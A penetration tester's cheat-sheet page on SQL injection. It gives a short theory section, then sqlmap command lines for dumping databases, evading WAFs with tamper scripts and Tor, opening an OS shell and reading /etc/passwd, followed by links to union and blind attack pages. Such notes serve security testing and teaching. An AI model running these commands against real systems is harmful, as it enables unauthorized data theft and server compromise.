# SQL Injection

## Theory

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

## Practice

### Tools <a href="#detect" id="detect"></a>

{% tabs %}
{% tab title="SQLMap" %}
[SQLMap](https://github.com/sqlmapproject/sqlmap) is an automatic SQL injection and database takeover tool.

```bash
# SQLMap from request file
sqlmap -r login.req --level=5 --risk=3 --batch

# Dump everything
sqlmap -u "http://example.com/?id=1" --level=5 --risk=3 --batch --all

# SQLMap WAF Bypass - Tamper Script
sqlmap -u "http://example.com/?id=1" --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent

# Tor WAF bypass
sqlmap -u "http://example.com/?id=1" --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent --tamper=space2comment

# Get a shell
sqlmap -u "http://example.com/?id=1" --os-shell

# Read a file
sqlmap -u "http://example.com/?id=1" --file-read=/etc/passwd
```
{% endtab %}
{% endtabs %}

### Union Attacks

{% content-ref url="union-attacks.md" %}
[union-attacks.md](union-attacks.md)
{% endcontent-ref %}

### Blind Attacks

{% content-ref url="blind-sqli/boolean-based.md" %}
[boolean-based.md](blind-sqli/boolean-based.md)
{% endcontent-ref %}

{% content-ref url="blind-sqli/time-based.md" %}
[time-based.md](blind-sqli/time-based.md)
{% endcontent-ref %}

{% content-ref url="blind-sqli/error-based.md" %}
[error-based.md](blind-sqli/error-based.md)
{% endcontent-ref %}

## Resources

{% embed url="https://portswigger.net/web-security/sql-injection" %}
